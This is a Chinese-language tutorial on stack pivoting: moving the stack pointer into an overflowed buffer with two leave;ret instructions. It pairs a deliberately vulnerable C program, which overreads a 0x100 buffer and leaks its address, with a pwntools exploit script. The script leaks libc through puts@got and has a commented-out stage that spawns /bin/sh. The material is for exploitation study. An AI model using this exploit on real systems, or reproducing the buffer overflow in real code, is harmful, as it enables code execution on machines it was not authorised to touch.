## 栈迁移

栈迁移主要就是为了解决栈溢出空间大小不足的问题

通过栈迁移可以把fake_ebp-4(32位的情况，如果是64位就是fake_rbp-8)通过着这种方法是的运行两次leave可以把esp的数据修改为fake_ebp，从而完成栈迁移这样就是在溢出不住的情况下来完整构造rop链

## 栈迁移到数据填充段

实际步骤

```tex
leave -> mov esp,ebp;pop ebp;

ret;

第一次leave;ret;会把栈上的ebp->ebp寄存器

第二次leave;ret;相当于寄存器的值->esp寄存器

并且esp+=4
```

使用这个方法的主要一点是要获取到buf的实际栈地址

因此我们要使用这个方法就要泄露出当时buf的空间来使得我们可以进行迁移

因此我们这里使用一个程序进行构造

```python
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void vuln() {
    char buf[0x100];
    printf("buf addr: %p\n", buf);
    puts("please input:");
    read(0, buf, 0x300);
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    vuln();

    return 0;
}

```

这个程序就是使用了一个格式化字符串来返回一个buf地址使得我们可以使用同时在这里满足了这个填充段数据的迁移因此我们可以使用栈迁移的方式来使用

脚本

```python
from pwn import *
context.log_level='debug'
io = process("./test")
libc = ELF("./libc-2.31.so")
elf = ELF("./test")

io.recvuntil('buf addr: ')
buf_addr = int(io.recvline(False),16)
log.info("buf_add: "+hex(buf_addr))

payload = b''
payload += p64(0x0401293)#rdi
payload += p64(elf.got['puts']) # puts@got
payload += p64(0x401070) # puts@plt
payload += p64(elf.sym['vuln'])
payload = payload.ljust(0x100, b'\x00')
payload += p64(buf_addr - 8)
payload += p64(elf.search(asm('leave; ret;'), executable=True).__next__())

gdb.attach(io)
io.sendlineafter("please input:",payload)

# pause()
# gdb.attach(io)
io.recv()
libc_address = u64(io.recv(6).ljust(8,b'\x00'))-libc.symbols['puts']
log.info("libc_base: " + hex(libc_address))

# payload = b''
# payload += p64(elf.search(asm('pop rdi; ret;'), executable=True).next())
# payload += p64(libc.search("/bin/sh").__next__()) # puts@got
# payload += p64(libc.sym['system']) # puts@plt
# payload = payload.ljust(0x100, 'x00')
# payload += p64(buf_addr - 8)
# payload += p64(elf.search(asm('leave; ret;'), executable=True).__next__())
# io.sendafter("please input:n", payload)

io.interactive()
```

